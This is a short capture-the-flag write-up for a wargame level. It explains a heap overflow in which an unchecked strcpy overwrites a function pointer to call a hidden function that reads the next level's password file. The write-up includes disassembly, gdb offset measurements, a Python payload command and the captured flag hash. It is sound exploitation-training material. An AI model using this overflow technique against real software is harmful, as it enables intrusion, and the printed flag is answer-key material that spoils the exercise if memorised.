# Way to level7

## Core
`main` allocates two heap chunks: `buf1 = malloc(0x40)` and `buf2 = malloc(4)`, storing the
address of `m()` into `buf2` as a function pointer. `strcpy(buf1, argv[1])` has **no length
check** → overflow `buf1` into `buf2`, overwriting that pointer with `n()`'s address. `main`
then does `call *buf2`, so it runs `n()` = `system("/bin/cat .../level7/.pass")`.

## Decisive disass (full: `disas main`, `disas n`)
```
main:
<+41>: mov  $0x8048468,%edx    ; m() address...
<+50>: mov  %edx,(%eax)        ; ...stored into buf2 (the fn pointer)
<+73>: call strcpy@plt         ; strcpy(buf1, argv[1]) — no length check -> heap overflow
<+78>: mov  0x18(%esp),%eax    ; eax = buf2
<+84>: call *%eax              ; call *buf2 — hijacked here
n (unused, info functions):
0x08048454 <+0>                ; n() entry = our target
<+6>:  movl $0x80485b0,(%esp)  ; x/s -> "/bin/cat /home/user/level7/.pass"
```

## Exploit
- padding 72 (derivation): measured in gdb, not assumed. Break at `main+41`, run, then
  `x/wx $esp+0x1c` = buf1 `0x0804a008`, `x/wx $esp+0x18` = buf2 `0x0804a050` →
  distance `0x50 − 0x08 = 0x48 = 72`. (malloc(64) + heap chunk header/alignment makes it
  >64, hence the GDB measurement)
- Value: `n() = 0x08048454` (source: `info functions`/`disas n`+0). Little-endian
  `\x54\x84\x04\x08`.
- payload: `'A'*72 + '\x54\x84\x04\x08'`
- Delivery: input comes via **`argv[1]`**, not stdin. `n()` runs cat as a one-shot command →
  no cat - trick (same as level4).
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

## Diff from previous
level5 hijacked flow with a **GOT overwrite via FSB** (stdin input, interactive `/bin/sh`,
cat - trick). level6 is a **heap overflow**: `strcpy` with no length check overflows `buf1`
into `buf2`'s **function pointer**, which `call *%eax` then invokes. Input arrives through
`argv[1]`, and `system` runs cat directly → no trick needed (like level4).

## Result
`f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
